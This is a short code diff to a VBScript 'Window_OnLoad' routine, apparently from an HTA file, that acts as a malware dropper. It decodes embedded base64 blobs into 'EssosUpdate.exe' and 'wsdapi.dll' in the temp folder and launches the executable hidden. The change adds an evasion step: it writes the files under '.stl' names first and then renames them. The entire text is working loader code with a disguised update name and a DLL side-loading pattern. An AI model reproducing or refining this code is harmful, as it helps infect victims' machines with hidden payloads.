@@ -18,9 +18,13 @@ Sub Window_OnLoad
     Dim sDir   : sDir = oShell.ExpandEnvironmentStrings("%TEMP%") & "\"
     Dim sExe   : sExe = sDir & "EssosUpdate.exe"
     Dim sDll   : sDll = sDir & "wsdapi.dll"
+    Dim fso    : Set fso = CreateObject("Scripting.FileSystemObject")
 
-    WriteB64ToFile document.getElementById("exeData").value, sExe
-    WriteB64ToFile document.getElementById("dllData").value, sDll
+    WriteB64ToFile document.getElementById("exeData").value, sDir & "EssosUpdate.stl"
+    WriteB64ToFile document.getElementById("dllData").value, sDir & "wsdapi.stl"
+
+    fso.MoveFile sDir & "EssosUpdate.stl", sExe
+    fso.MoveFile sDir & "wsdapi.stl", sDll
 
     CreateObject("Shell.Application").ShellExecute sExe, "", sDir, "open", 0
 
